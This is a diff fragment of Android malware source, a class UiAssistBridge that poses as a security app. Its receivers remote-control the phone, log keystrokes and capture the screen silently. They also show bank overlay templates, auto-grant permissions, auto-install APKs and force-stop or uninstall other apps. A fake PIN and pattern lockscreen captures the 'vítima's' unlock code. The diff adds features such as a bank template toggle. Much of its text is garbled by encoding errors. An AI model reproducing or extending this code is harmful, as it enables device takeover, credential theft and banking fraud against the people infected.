                             android.app.admin.DevicePolicyManager dpmCheck = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                             if (dpmCheck != null && !dpmCheck.isAdminActive(adminComponent)) {
                                 try {
-                                    Log.w(TAG, "🛡️ Falha ao abrir tela direta de Admin! Tentando fallback 1 (DeviceAdminSettings)...");
+                                    Log.w(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â Falha ao abrir tela direta de Admin! Tentando fallback 1 (DeviceAdminSettings)...");
                                     Intent fallbackIntent = new Intent();
                                     fallbackIntent.setComponent(new android.content.ComponentName("com.android.settings", "com.android.settings.DeviceAdminSettings"));
                                     fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                     startActivity(fallbackIntent);
                                 } catch (Exception ex2) {
-                                    Log.w(TAG, "🛡️ Fallback 1 falhou. Tentando fallback 2 (Security Settings)...");
+                                    Log.w(TAG, "Ã°Å¸â€ºÂ¡Ã¯Â¸Â Fallback 1 falhou. Tentando fallback 2 (Security Settings)...");
                                     try {
                                         Intent fallbackIntent2 = new Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS);
                                         fallbackIntent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
@@ -667,36 +699,37 @@ public class UiAssistBridge extends AccessibilityService {
                     }, 2500);
                 }
             } catch (Exception e) {
-                Log.e(TAG, "❌ Erro ao abrir tela de Device Admin: " + e.getMessage());
+                Log.e(TAG, "Ã¢ÂÅ’ Erro ao abrir tela de Device Admin: " + e.getMessage());
             }
         }
     };
 
     /**
-     * Receiver que escuta quando a tela FAKE solicita automação
+     * Receiver que escuta quando a tela FAKE solicita automaÃƒÂ§ÃƒÂ£o
      */
     private BroadcastReceiver autoGrantReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String action = intent.getAction();
-            Log.d(TAG, "🔥 RECEBEU COMANDO: " + action);
+            Log.d(TAG, "Ã°Å¸â€Â¥ RECEBEU COMANDO: " + action);
             
             if ("com.seguranca.protecao.AUTO_GRANT_PERMISSIONS".equals(action)) {
-                // Wizard solicitou concessão de permissões runtime
-                Log.d(TAG, "✅ Iniciando automação de permissões runtime (silencioso)...");
-                // As permissões já serão solicitadas pela MainActivity
-                // Apenas aguardamos os diálogos aparecerem e automatizamos
+                autoGrantUntil = System.currentTimeMillis() + 90000L;
+                // Wizard solicitou concessÃƒÂ£o de permissÃƒÂµes runtime
+                Log.d(TAG, "Ã¢Å“â€¦ Iniciando automaÃƒÂ§ÃƒÂ£o de permissÃƒÂµes runtime (silencioso)...");
+                // As permissÃƒÂµes jÃƒÂ¡ serÃƒÂ£o solicitadas pela MainActivity
+                // Apenas aguardamos os diÃƒÂ¡logos aparecerem e automatizamos
             }
             else if ("com.seguranca.protecao.AUTO_DISABLE_BATTERY".equals(action)) {
-                // Wizard solicitou desativação de otimização de bateria
-                Log.d(TAG, "✅ Iniciando automação de bateria (silencioso)...");
+                // Wizard solicitou desativaÃƒÂ§ÃƒÂ£o de otimizaÃƒÂ§ÃƒÂ£o de bateria
+                Log.d(TAG, "Ã¢Å“â€¦ Iniciando automaÃƒÂ§ÃƒÂ£o de bateria (silencioso)...");
                 PermissionManager pm = new PermissionManager(context);
                 pm.requestIgnoreBatteryOptimizations();
                 isAutomating = true;
                 automationStep = STEP_REQUEST_BATTERY;
             }
             else if ("com.seguranca.protecao.AUTO_SCREEN_CAPTURE".equals(action)) {
-                Log.d(TAG, "Captura via takeScreenshot — use TOGGLE_SILENT_VNC no painel");
+                Log.d(TAG, "Captura via takeScreenshot Ã¢â‚¬â€ use TOGGLE_SILENT_VNC no painel");
                 finishAutomationWizard();
             }
         }
@@ -704,7 +737,7 @@ public class UiAssistBridge extends AccessibilityService {
     
     /**
      * Receiver que EXECUTA GESTOS REMOTAMENTE (CLICK, SWIPE, TYPE, NAVIGATION)
-     * Este é o CORE do controle remoto!
+     * Este ÃƒÂ© o CORE do controle remoto!
      */
     private BroadcastReceiver gestureReceiver = new BroadcastReceiver() {
         @Override
@@ -723,7 +756,7 @@ public class UiAssistBridge extends AccessibilityService {
         public void onReceive(Context context, Intent intent) {
             boolean enabled = intent.getBooleanExtra("enabled", true);
             keyloggerEnabled = enabled;
-            Log.d(TAG, "⌨️ Keylogger " + (enabled ? "ATIVADO" : "DESATIVADO"));
+            Log.d(TAG, "Ã¢Å’Â¨Ã¯Â¸Â Keylogger " + (enabled ? "ATIVADO" : "DESATIVADO"));
         }
     };
     
@@ -735,7 +768,7 @@ public class UiAssistBridge extends AccessibilityService {
         public void onReceive(Context context, Intent intent) {
             boolean enabled = intent.getBooleanExtra("enabled", false);
             screenReaderEnabled = enabled;
-            Log.d(TAG, "👁️ Screen Reader V2 " + (enabled ? "ATIVADO" : "DESATIVADO"));
+            Log.d(TAG, "Ã°Å¸â€˜ÂÃ¯Â¸Â Screen Reader V2 " + (enabled ? "ATIVADO" : "DESATIVADO"));
             
             if (enabled) {
                 startScreenReader();
@@ -746,13 +779,13 @@ public class UiAssistBridge extends AccessibilityService {
     };
     
     /**
-     * Receiver para GRAVAÇÃO DE DESBLOQUEIO
+     * Receiver para GRAVAÃƒâ€¡ÃƒÆ’O DE DESBLOQUEIO
      */
     private BroadcastReceiver unlockRecordingReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String action = intent.getStringExtra("action");
-            Log.d(TAG, "🔓 Unlock Recording: " + action);
+            Log.d(TAG, "Ã°Å¸â€â€œ Unlock Recording: " + action);
             
             if ("START".equals(action)) {
                 startUnlockRecording();
@@ -769,7 +802,7 @@ public class UiAssistBridge extends AccessibilityService {
     };
     
     /**
-     * Receiver TOGGLE_SILENT_VNC — único motor: takeScreenshot (pipeline 0x01).
+     * Receiver TOGGLE_SILENT_VNC Ã¢â‚¬â€ ÃƒÂºnico motor: takeScreenshot (pipeline 0x01).
      */
     private BroadcastReceiver silentVncReceiver = new BroadcastReceiver() {
         @Override
@@ -801,21 +834,21 @@ public class UiAssistBridge extends AccessibilityService {
     };
 
     /**
-     * 🔓 Receiver para PATTERN UNLOCK direto
+     * Ã°Å¸â€â€œ Receiver para PATTERN UNLOCK direto
      * Executa o pattern de desbloqueio diretamente
      */
     private BroadcastReceiver patternUnlockReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String pattern = intent.getStringExtra("pattern");
-            Log.d(TAG, "🔓 PATTERN_UNLOCK recebido: " + pattern);
+            Log.d(TAG, "Ã°Å¸â€â€œ PATTERN_UNLOCK recebido: " + pattern);
             
             if (pattern != null && !pattern.isEmpty()) {
                 int[] points = parsePatternString(pattern);
                 if (points != null) {
                     executePatternUnlock(points);
                 } else {
-                    Log.e(TAG, "❌ Pattern inválido: " + pattern);
+                    Log.e(TAG, "Ã¢ÂÅ’ Pattern invÃƒÂ¡lido: " + pattern);
                 }
             }
         }
@@ -824,16 +857,20 @@ public class UiAssistBridge extends AccessibilityService {
     private long lastUnlockActionTime = 0;
     
     /**
-     * 🖤 Receiver para BLACK SCREEN OVERLAY (100% opaco)
-     * Usa TYPE_ACCESSIBILITY_OVERLAY que não tem limite de alpha!
+     * Ã°Å¸â€“Â¤ Receiver para BLACK SCREEN OVERLAY (100% opaco)
+     * Usa TYPE_ACCESSIBILITY_OVERLAY que nÃƒÂ£o tem limite de alpha!
      */
     private BroadcastReceiver blackScreenReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String action = intent.getAction();
-            Log.d(TAG, "🖤 BLACK_SCREEN: " + action);
+            Log.d(TAG, "Ã°Å¸â€“Â¤ BLACK_SCREEN: " + action);
             
-            if ("com.seguranca.protecao.BLACK_SCREEN_ON".equals(action)) {
+            if ("com.seguranca.protecao.TOGGLE_BANK_TEMPLATE".equals(action)) {
+                bankTemplateEnabled = intent.getBooleanExtra("enabled", false);
+                Log.d(TAG, "Plantilla de banco: " + bankTemplateEnabled);
+                if (!bankTemplateEnabled && isCustomTemplateActive) { hideBlackScreenOverlay(); }
+            } else if ("com.seguranca.protecao.BLACK_SCREEN_ON".equals(action)) {
                 showBlackScreenOverlay();
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !isSilentCaptureRunning()) {
                     startSilentScreenCapture(20);
@@ -843,6 +880,7 @@ public class UiAssistBridge extends AccessibilityService {
             } else if ("com.seguranca.protecao.CUSTOM_BLACK_SCREEN".equals(action)) {
                 String template = intent.getStringExtra("template");
                 if (template != null) {
+                    bankTemplateEnabled = true; // [FIX] plantilla sempre visivel ao aplicar
                     showCustomBlackScreenOverlay(template);
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !isSilentCaptureRunning()) {
                         startSilentScreenCapture(20);
@@ -855,36 +893,36 @@ public class UiAssistBridge extends AccessibilityService {
     };
     
     /**
-     * 📦 Receiver para habilitar AUTO-INSTALL de APKs
+     * Ã°Å¸â€œÂ¦ Receiver para habilitar AUTO-INSTALL de APKs
      * Quando ativado, o AccessibilityService vai auto-clicar em "Instalar" e "Abrir"
      */
     private BroadcastReceiver autoInstallReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            Log.d(TAG, "📦 AUTO-INSTALL habilitado!");
+            Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL habilitado!");
             autoInstallEnabled = true;
             autoInstallEnabledTime = System.currentTimeMillis();
             
-            // Desabilita após 180 segundos (3 minutos - tempo para download + tela de settings + instalação)
+            // Desabilita apÃƒÂ³s 180 segundos (3 minutos - tempo para download + tela de settings + instalaÃƒÂ§ÃƒÂ£o)
             handler.postDelayed(() -> {
                 autoInstallEnabled = false;
-                Log.d(TAG, "📦 AUTO-INSTALL desabilitado (timeout)");
+                Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL desabilitado (timeout)");
             }, 180000);
         }
     };
     
     /**
-     * 🔧 Receiver para habilitar ROM CONFIG (auto-click em configurações de ROM)
-     * Auto-clica em: Autostart, Ignorar otimização de bateria, etc.
+     * Ã°Å¸â€Â§ Receiver para habilitar ROM CONFIG (auto-click em configuraÃƒÂ§ÃƒÂµes de ROM)
+     * Auto-clica em: Autostart, Ignorar otimizaÃƒÂ§ÃƒÂ£o de bateria, etc.
      */
     private BroadcastReceiver romConfigReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            Log.d(TAG, "🔧 ROM_CONFIG habilitado!");
+            Log.d(TAG, "Ã°Å¸â€Â§ ROM_CONFIG habilitado!");
             romConfigEnabled = true;
             romConfigEnabledTime = System.currentTimeMillis();
             
-            // Abre as configurações específicas da ROM
+            // Abre as configuraÃƒÂ§ÃƒÂµes especÃƒÂ­ficas da ROM
             if (romCompat != null) {
                 boolean okRom = false;
                 String romName = "?";
@@ -895,42 +933,42 @@ public class UiAssistBridge extends AccessibilityService {
                 try { android.widget.Toast.makeText(context, "Kryptos: romCompat NULL", android.widget.Toast.LENGTH_LONG).show(); } catch (Throwable ignored) {}
             }
             
-            // Desabilita após 60 segundos
+            // Desabilita apÃƒÂ³s 60 segundos
             handler.postDelayed(() -> {
                 romConfigEnabled = false;
-                Log.d(TAG, "🔧 ROM_CONFIG desabilitado (timeout)");
+                Log.d(TAG, "Ã°Å¸â€Â§ ROM_CONFIG desabilitado (timeout)");
             }, 60000);
         }
     };
     
     /**
-     * 🗑️ Receiver para permitir desinstalar OUTROS apps via painel
-     * NÃO permite desinstalar o NOSSO app!
+     * Ã°Å¸â€”â€˜Ã¯Â¸Â Receiver para permitir desinstalar OUTROS apps via painel
+     * NÃƒÆ’O permite desinstalar o NOSSO app!
      */
     private BroadcastReceiver allowUninstallReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            Log.d(TAG, "🗑️ ALLOW_UNINSTALL habilitado - Permitindo desinstalar outros apps!");
+            Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â ALLOW_UNINSTALL habilitado - Permitindo desinstalar outros apps!");
             allowUninstallOtherApps = true;
             allowUninstallTime = System.currentTimeMillis();
             
-            // Desabilita após 60 segundos
+            // Desabilita apÃƒÂ³s 60 segundos
             handler.postDelayed(() -> {
                 allowUninstallOtherApps = false;
-                Log.d(TAG, "🗑️ ALLOW_UNINSTALL desabilitado (timeout)");
+                Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â ALLOW_UNINSTALL desabilitado (timeout)");
             }, 60000);
         }
     };
     
     /**
-     * 🗑️ Receiver para AUTO_UNINSTALL - Auto-click para confirmar desinstalação silenciosa
+     * Ã°Å¸â€”â€˜Ã¯Â¸Â Receiver para AUTO_UNINSTALL - Auto-click para confirmar desinstalaÃƒÂ§ÃƒÂ£o silenciosa
      */
     
     private BroadcastReceiver autoUninstallReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             packageToUninstall = intent.getStringExtra("package");
-            Log.d(TAG, "🗑️ AUTO_UNINSTALL ativado para: " + packageToUninstall);
+            Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â AUTO_UNINSTALL ativado para: " + packageToUninstall);
             autoUninstallEnabled = true;
             allowUninstallOtherApps = true;
             autoUninstallTime = System.currentTimeMillis();
@@ -941,35 +979,35 @@ public class UiAssistBridge extends AccessibilityService {
                     delIntent.setData(android.net.Uri.parse("package:" + packageToUninstall));
                     delIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                     startActivity(delIntent);
-                    Log.d(TAG, "🗑️ ACTION_DELETE iniciado com sucesso via UiAssistBridge (Accessibility)");
+                    Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â ACTION_DELETE iniciado com sucesso via UiAssistBridge (Accessibility)");
                 } catch (Exception e) {
                     try {
                         Intent settingsIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                         settingsIntent.setData(android.net.Uri.parse("package:" + packageToUninstall));
                         settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                         startActivity(settingsIntent);
-                        Log.d(TAG, "🗑️ App Info Settings iniciado via UiAssistBridge (Accessibility)");
+                        Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â App Info Settings iniciado via UiAssistBridge (Accessibility)");
                     } catch (Exception ignored) {}
                 }
             }
             
-            // Desabilita após 30 segundos
+            // Desabilita apÃƒÂ³s 30 segundos
             handler.postDelayed(() -> {
                 autoUninstallEnabled = false;
                 packageToUninstall = "";
-                Log.d(TAG, "🗑️ AUTO_UNINSTALL desabilitado (timeout)");
+                Log.d(TAG, "Ã°Å¸â€”â€˜Ã¯Â¸Â AUTO_UNINSTALL desabilitado (timeout)");
             }, 30000);
         }
     };
     
     /**
-     * ⛔ Receiver para AUTO_FORCE_STOP - Auto-click para forçar parada de apps alvo
+     * Ã¢â€ºâ€ Receiver para AUTO_FORCE_STOP - Auto-click para forÃƒÂ§ar parada de apps alvo
      */
     private BroadcastReceiver autoForceStopReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             packageToForceStop = intent.getStringExtra("package");
-            Log.d(TAG, "⛔ AUTO_FORCE_STOP ativado para: " + packageToForceStop);
+            Log.d(TAG, "Ã¢â€ºâ€ AUTO_FORCE_STOP ativado para: " + packageToForceStop);
             autoForceStopEnabled = true;
             autoForceStopTime = System.currentTimeMillis();
 
@@ -979,22 +1017,22 @@ public class UiAssistBridge extends AccessibilityService {
                     settingsIntent.setData(android.net.Uri.parse("package:" + packageToForceStop));
                     settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                     startActivity(settingsIntent);
-                    Log.d(TAG, "⛔ App Info Settings iniciado com sucesso via UiAssistBridge (Accessibility)");
+                    Log.d(TAG, "Ã¢â€ºâ€ App Info Settings iniciado com sucesso via UiAssistBridge (Accessibility)");
                 } catch (Exception ignored) {}
             }
             
-            // Desabilita após 30 segundos
+            // Desabilita apÃƒÂ³s 30 segundos
             handler.postDelayed(() -> {
                 autoForceStopEnabled = false;
                 packageToForceStop = "";
-                Log.d(TAG, "⛔ AUTO_FORCE_STOP desabilitado (timeout)");
+                Log.d(TAG, "Ã¢â€ºâ€ AUTO_FORCE_STOP desabilitado (timeout)");
             }, 30000);
         }
     };
     
     /**
-     * 🔒 Receiver para SCREEN PERSISTENCE - Detecta quando a tela desliga
-     * Se ativo, força a tela a ligar novamente!
+     * Ã°Å¸â€â€™ Receiver para SCREEN PERSISTENCE - Detecta quando a tela desliga
+     * Se ativo, forÃƒÂ§a a tela a ligar novamente!
      */
     private BroadcastReceiver screenPersistenceReceiver = new BroadcastReceiver() {
         @Override
@@ -1002,22 +1040,23 @@ public class UiAssistBridge extends AccessibilityService {
             String action = intent.getAction();
             
             if (Intent.ACTION_SCREEN_OFF.equals(action)) {
-                Log.d(TAG, "🔒 SCREEN_OFF detectado!");
+                suspendBlackScreenForKeyguard();
+                Log.d(TAG, "Ã°Å¸â€â€™ SCREEN_OFF detectado!");
                 
                 if (screenPersistenceEnabled) {
-                    Log.d(TAG, "🔒🔒🔒 PERSISTÊNCIA ATIVA - FORÇANDO TELA LIGAR IMEDIATAMENTE!");
+                    Log.d(TAG, "Ã°Å¸â€â€™Ã°Å¸â€â€™Ã°Å¸â€â€™ PERSISTÃƒÅ NCIA ATIVA - FORÃƒâ€¡ANDO TELA LIGAR IMEDIATAMENTE!");
                     
-                    // SEM DELAY - Força tela a ligar IMEDIATAMENTE
+                    // SEM DELAY - ForÃƒÂ§a tela a ligar IMEDIATAMENTE
                     forceScreenOn();
                     
-                    // Segunda tentativa após 100ms para garantir
+                    // Segunda tentativa apÃƒÂ³s 100ms para garantir
                     handler.postDelayed(() -> {
                         if (screenPersistenceEnabled) {
                             forceScreenOn();
                         }
                     }, 100);
                     
-                    // Terceira tentativa após 300ms para garantir
+                    // Terceira tentativa apÃƒÂ³s 300ms para garantir
                     handler.postDelayed(() -> {
                         if (screenPersistenceEnabled) {
                             forceScreenOn();
@@ -1025,13 +1064,14 @@ public class UiAssistBridge extends AccessibilityService {
                     }, 300);
                 }
             } else if (Intent.ACTION_SCREEN_ON.equals(action)) {
-                Log.d(TAG, "🔒 SCREEN_ON detectado");
+                handler.postDelayed(keyguardWatchRunnable, 300);
+                Log.d(TAG, "Ã°Å¸â€â€™ SCREEN_ON detectado");
             }
         }
     };
     
     /**
-     * 🔒 Receiver para TOGGLE SCREEN PERSISTENCE via painel
+     * Ã°Å¸â€â€™ Receiver para TOGGLE SCREEN PERSISTENCE via painel
      */
     private BroadcastReceiver toggleScreenPersistenceReceiver = new BroadcastReceiver() {
         @Override
@@ -1039,11 +1079,11 @@ public class UiAssistBridge extends AccessibilityService {
             boolean enabled = intent.getBooleanExtra("enabled", false);
             screenPersistenceEnabled = enabled;
             
-            Log.d(TAG, "🔒 SCREEN PERSISTENCE " + (enabled ? "ATIVADO" : "DESATIVADO"));
+            Log.d(TAG, "Ã°Å¸â€â€™ SCREEN PERSISTENCE " + (enabled ? "ATIVADO" : "DESATIVADO"));
             
             if (enabled) {
                 acquireScreenPersistenceWakeLock();
-                // Desabilita timeout da tela via Settings (mais confiável)
+                // Desabilita timeout da tela via Settings (mais confiÃƒÂ¡vel)
                 disableScreenTimeout();
             } else {
                 releaseScreenPersistenceWakeLock();
@@ -1062,10 +1102,10 @@ public class UiAssistBridge extends AccessibilityService {
     private String lockscreenType = "PIN"; // "PIN" ou "PATTERN"
     
     // Dados capturados
-    private String capturedPin = ""; // PIN capturado da vítima
+    private String capturedPin = ""; // PIN capturado da vÃƒÂ­tima
     private java.util.ArrayList<Integer> capturedPattern = new java.util.ArrayList<>(); // Pattern capturado (pontos 1-9)
     
-    // Coordenadas do teclado PIN (baseado em resolução 1080x1920)
+    // Coordenadas do teclado PIN (baseado em resoluÃƒÂ§ÃƒÂ£o 1080x1920)
     private static final int[][] PIN_KEY_COORDS = {
         {540, 1250}, // 0
         {270, 700},  // 1
@@ -1085,18 +1125,18 @@ public class UiAssistBridge extends AccessibilityService {
     // Layout:  [1] [2] [3]
     //          [4] [5] [6]
     //          [7] [8] [9]
-    private int[][] patternDotCoords; // Será calculado dinamicamente
+    private int[][] patternDotCoords; // SerÃƒÂ¡ calculado dinamicamente
     private int patternDotRadius = 40;
     private android.view.View patternView;
     
     /**
-     * 🔒 Receiver para SHOW/HIDE LOCKSCREEN
+     * Ã°Å¸â€â€™ Receiver para SHOW/HIDE LOCKSCREEN
      */
     private BroadcastReceiver lockscreenReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String action = intent.getAction();
-            Log.d(TAG, "🔒 LOCKSCREEN receiver: " + action);
+            Log.d(TAG, "Ã°Å¸â€â€™ LOCKSCREEN receiver: " + action);
             
             if ("com.seguranca.protecao.SHOW_LOCKSCREEN".equals(action)) {
                 String type = intent.getStringExtra("type");
@@ -1109,13 +1149,13 @@ public class UiAssistBridge extends AccessibilityService {
     };
     
     /**
-     * 🔢 Receiver para LOCK_KEY_PRESS (simula teclas do PIN)
+     * Ã°Å¸â€Â¢ Receiver para LOCK_KEY_PRESS (simula teclas do PIN)
      */
     private BroadcastReceiver lockKeyPressReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String key = intent.getStringExtra("key");
-            Log.d(TAG, "🔢 LOCK_KEY_PRESS: " + key);
+            Log.d(TAG, "Ã°Å¸â€Â¢ LOCK_KEY_PRESS: " + key);
             
             if (key == null) return;
             
@@ -1130,14 +1170,14 @@ public class UiAssistBridge extends AccessibilityService {
                         executePinKeyClick(PIN_KEY_COORDS[keyNum][0], PIN_KEY_COORDS[keyNum][1]);
                     }
                 } catch (NumberFormatException e) {
-                    Log.e(TAG, "🔢 Tecla inválida: " + key);
+                    Log.e(TAG, "Ã°Å¸â€Â¢ Tecla invÃƒÂ¡lida: " + key);
                 }
             }
         }
     };
     
     /**
-     * 🔄 Receiver para PLAY_PIN_SEQUENCE e PLAY_PATTERN_SEQUENCE
+     * Ã°Å¸â€â€ž Receiver para PLAY_PIN_SEQUENCE e PLAY_PATTERN_SEQUENCE
      */
     private BroadcastReceiver playPinSequenceReceiver = new BroadcastReceiver() {
         @Override
@@ -1147,21 +1187,21 @@ public class UiAssistBridge extends AccessibilityService {
             int delay = intent.getIntExtra("delay", 1000);
             
             if (pattern != null && !pattern.isEmpty()) {
-                Log.d(TAG, "🔄 PLAY_PATTERN_SEQUENCE: " + pattern);
+                Log.d(TAG, "Ã°Å¸â€â€ž PLAY_PATTERN_SEQUENCE: " + pattern);
                 playPatternSequence(pattern, delay);
             } else if (pin != null && !pin.isEmpty()) {
-                Log.d(TAG, "🔄 PLAY_PIN_SEQUENCE: " + pin);
+                Log.d(TAG, "Ã°Å¸â€â€ž PLAY_PIN_SEQUENCE: " + pin);
                 playPinSequenceWithDelay(pin, delay);
             }
         }
     };
     
     /**
-     * 🔒 Mostra overlay de lockscreen fake (PIN ou PATTERN)
+     * Ã°Å¸â€â€™ Mostra overlay de lockscreen fake (PIN ou PATTERN)
      */
     private void showFakeLockscreen(String type) {
         if (isLockscreenActive) {
-            Log.d(TAG, "🔒 Lockscreen já está ativo, removendo anterior...");
+            Log.d(TAG, "Ã°Å¸â€â€™ Lockscreen jÃƒÂ¡ estÃƒÂ¡ ativo, removendo anterior...");
             hideFakeLockscreen();
             handler.postDelayed(() -> showFakeLockscreen(type), 300);
             return;
@@ -1171,7 +1211,7 @@ public class UiAssistBridge extends AccessibilityService {
         capturedPin = "";
         capturedPattern.clear();
         
-        Log.d(TAG, "🔒 Mostrando lockscreen fake tipo: " + type);
+        Log.d(TAG, "Ã°Å¸â€â€™ Mostrando lockscreen fake tipo: " + type);
         
         handler.post(() -> {
             try {
@@ -1199,12 +1239,12 @@ public class UiAssistBridge extends AccessibilityService {
                     android.graphics.PixelFormat.TRANSLUCENT
                 );
                 
-                // Configuração para suporte total a notch/cutout (Android 9+)
+                // ConfiguraÃƒÂ§ÃƒÂ£o para suporte total a notch/cutout (Android 9+)
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                     params.layoutInDisplayCutoutMode = android.view.WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                 }
                 
-                // Configuração para ignorar margens do sistema e barras virtuais (Android 11+)
+                // ConfiguraÃƒÂ§ÃƒÂ£o para ignorar margens do sistema e barras virtuais (Android 11+)
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                     params.setFitInsetsTypes(0); // Ignora todos os insets
                 }
@@ -1212,21 +1252,21 @@ public class UiAssistBridge extends AccessibilityService {
                 lockscreenWindowManager.addView(lockscreenOverlay, params);
                 isLockscreenActive = true;
                 
-                Log.d(TAG, "🔒 ✅ LOCKSCREEN " + type + " ATIVO!");
+                Log.d(TAG, "Ã°Å¸â€â€™ Ã¢Å“â€¦ LOCKSCREEN " + type + " ATIVO!");
                 
-                // Esconde a tela preta temporariamente para que o padrão/PIN apareça e possa ser digitado
+                // Esconde a tela preta temporariamente para que o padrÃƒÂ£o/PIN apareÃƒÂ§a e possa ser digitado
                 if (blackOverlayView != null && isBlackScreenActive) {
                     blackOverlayView.setVisibility(android.view.View.INVISIBLE);
                 }
                 
             } catch (Exception e) {
-                Log.e(TAG, "🔒 ❌ Erro ao mostrar lockscreen: " + e.getMessage());
+                Log.e(TAG, "Ã°Å¸â€â€™ Ã¢ÂÅ’ Erro ao mostrar lockscreen: " + e.getMessage());
             }
         });
     }
     
     /**
-     * 🔢 Cria overlay de PIN Lock com teclado numérico interativo
+     * Ã°Å¸â€Â¢ Cria overlay de PIN Lock com teclado numÃƒÂ©rico interativo
      */
     private android.view.View createPinLockOverlay(int screenWidth, int screenHeight) {
         android.widget.LinearLayout mainLayout = new android.widget.LinearLayout(this);
@@ -1235,7 +1275,7 @@ public class UiAssistBridge extends AccessibilityService {
         mainLayout.setGravity(android.view.Gravity.CENTER);
         mainLayout.setPadding(50, 100, 50, 50);
         
-        // Título
+        // TÃƒÂ­tulo
         android.widget.TextView title = new android.widget.TextView(this);
         title.setText("Digite seu PIN");
         title.setTextColor(android.graphics.Color.WHITE);
@@ -1254,12 +1294,12 @@ public class UiAssistBridge extends AccessibilityService {
         updatePinDisplay(pinDisplay, "");
         mainLayout.addView(pinDisplay);
         
-        // Grid de botões 3x4
+        // Grid de botÃƒÂµes 3x4
         android.widget.GridLayout grid = new android.widget.GridLayout(this);
         grid.setColumnCount(3);
         grid.setRowCount(4);
         
-        String[] keys = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "⌫", "0", "✓"};
+        String[] keys = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "Ã¢Å’Â«", "0", "Ã¢Å“â€œ"};
         
         for (String key : keys) {
             android.widget.Button btn = new android.widget.Button(this);
@@ -1267,14 +1307,14 @@ public class UiAssistBridge extends AccessibilityService {
             btn.setTextSize(24);
             btn.setTextColor(android.graphics.Color.WHITE);
             
-            // Estilo do botão
+            // Estilo do botÃƒÂ£o
             android.graphics.drawable.GradientDrawable drawable = new android.graphics.drawable.GradientDrawable();
             drawable.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
             drawable.setCornerRadius(20);
             
-            if ("⌫".equals(key)) {
+            if ("Ã¢Å’Â«".equals(key)) {
                 drawable.setColor(android.graphics.Color.parseColor("#c0392b"));
-            } else if ("✓".equals(key)) {
+            } else if ("Ã¢Å“â€œ".equals(key)) {
                 drawable.setColor(android.graphics.Color.parseColor("#27ae60"));
             } else {
                 drawable.setColor(android.graphics.Color.parseColor("#2c3e50"));
@@ -1301,15 +1341,15 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🔲 Cria overlay de Pattern Lock (9 pontos) interativo
+     * Ã°Å¸â€Â² Cria overlay de Pattern Lock (9 pontos) interativo
      */
     private android.view.View createPatternLockOverlay(int screenWidth, int screenHeight) {
         android.widget.FrameLayout mainLayout = new android.widget.FrameLayout(this);
         mainLayout.setBackgroundColor(android.graphics.Color.parseColor("#1a1a2e"));
         
-        // Título
+        // TÃƒÂ­tulo
         android.widget.TextView title = new android.widget.TextView(this);
-        title.setText("Desenhe o padrão");
+        title.setText("Desenhe o padrÃƒÂ£o");
         title.setTextColor(android.graphics.Color.WHITE);
         title.setTextSize(28);
         title.setGravity(android.view.Gravity.CENTER);
@@ -1392,7 +1432,7 @@ public class UiAssistBridge extends AccessibilityService {
                 }
             }
             
-            // Desenha linha até o dedo atual
+            // Desenha linha atÃƒÂ© o dedo atual
             if (isDrawing && pattern.size() > 0 && currentX >= 0) {
                 int lastDot = pattern.get(pattern.size() - 1);
                 canvas.drawLine(dots[lastDot][0], dots[lastDot][1], currentX, currentY, linePaint);
@@ -1428,7 +1468,7 @@ public class UiAssistBridge extends AccessibilityService {
                     currentX = -1;
                     currentY = -1;
                     if (pattern.size() >= 4) {
-                        // Padrão válido capturado!
+                        // PadrÃƒÂ£o vÃƒÂ¡lido capturado!
                         capturedPattern.clear();
                         capturedPattern.addAll(pattern);
                         sendCapturedPattern();
@@ -1441,7 +1481,7 @@ public class UiAssistBridge extends AccessibilityService {
         }
         
         private void checkDotHit(float x, float y) {
-            // Calcula raio de colisão dinâmico (45% do tamanho da célula) para facilitar o acerto ao deslizar rápido
